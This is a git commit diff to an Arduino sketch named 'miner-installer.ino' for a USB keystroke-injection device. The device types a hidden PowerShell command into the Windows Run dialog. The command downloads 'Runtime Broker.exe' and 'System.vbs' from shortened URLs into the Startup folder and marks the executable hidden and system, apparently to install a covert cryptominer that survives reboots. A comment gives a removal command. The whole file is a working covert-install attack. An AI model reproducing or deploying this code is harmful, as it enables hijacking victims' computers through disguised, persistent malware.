477678fc6b23665d9b976f827e955e6d436b904f
TyraVex <34800546+TyraVex@users.noreply.github.com>
2021-11-20 23:54:50 +0100

    Update miner-installer.ino

--- miner-installer/miner-installer.ino
+++ miner-installer/miner-installer.ino
@@ -1,17 +1,17 @@
 #include "DigiKeyboardFr.h"
 
 void setup() {
-  //opens powershell
+  //opens windows run
   DigiKeyboardFr.delay(1);
   DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
   DigiKeyboardFr.delay(50);
   
-  //write powershell -windowstyle hidden -command "iwr u.nu/d1uTS -o \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\rl.url\""
-  DigiKeyboardFr.println("powershell -windowstyle hidden -command \"iwr u.nu/d1uTS -o \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\rl.url\\\"\"");
+  //type: powershell -windowstyle hidden -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";iwr 3.ly/acKvl -o \"Runtime Broker.exe\";iwr 3.ly/acKvu -o System.vbs;ATTRIB +H +S \"Runtime Broker.exe\""
+  DigiKeyboardFr.println("powershell -windowstyle hidden -command \"cd \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\";iwr 3.ly/acKvl -o \\\"Runtime Broker.exe\\\";iwr 3.ly/acKvu -o System.vbs\";ATTRIB +H +S *.exe");
 }
 
 void loop() {
 }
 
 // removal command :
-// powershell -command "rm \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\rl.url\""
+// powershell -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";ATTRIB -H -S \"Runtime Broker.exe\";rm \"Runtime Broker.exe\";rm System.vbs"
